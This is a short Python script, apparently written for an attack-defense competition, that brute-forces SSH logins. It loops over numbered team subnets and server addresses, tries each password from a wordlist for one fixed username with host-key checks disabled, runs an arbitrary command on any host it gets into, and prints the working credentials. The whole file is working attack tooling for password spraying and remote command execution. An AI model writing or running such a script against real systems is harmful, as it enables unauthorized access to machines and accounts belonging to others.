import pty
import sys
import asyncio
import pexpect

async def ssh(user, host, cmd, password, timeout=1):
	try:                                                                                                                                                                                                                                    
		options = '-q -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -oPubkeyAuthentication=no -f'                                                                         

		ssh_cmd = f'ssh {user}@{host} {options} "{cmd}"'                                                                                                              
		child = pexpect.spawn(ssh_cmd, timeout=timeout, encoding="utf-8")   
		child.log_file = open("list.log", "w")                                                                                                                         
		child.expect(['password: '])                                                                                                                                                                                                                                                                                               
		child.sendline(password)                                                                                                                                                                                                                                                                                                     
		child.expect(pexpect.EOF)   
		print(f"User: {user}\tHost: {host}: Pwd: {password}")                                                                                                                                               
		child.close()
	except:
		return                                                                                                                                                                                                                                                                                                             



# fuck around with any command we want
command = """

"""

default_passwords = []

with open("wordlist.txt") as f:
	default_passwords = f.readlines()


# each team
for team in range(1, 17):
	if team == 14: continue
	# each teams servers
	for server in [1, 2, 3, 4, 5, 6, 11, 12, 13, 20, 21, 22, 42, 69]:
		# check each default password
		for password in default_passwords:
			asyncio.run(ssh(user="Yuugo.Takagawa", host=f"10.{team}.1.{server}", cmd=command, password=password))
			asyncio.run(ssh(user="Yuugo.Takagawa", host=f"172.16.{team}.{server}", cmd=command, password=password))






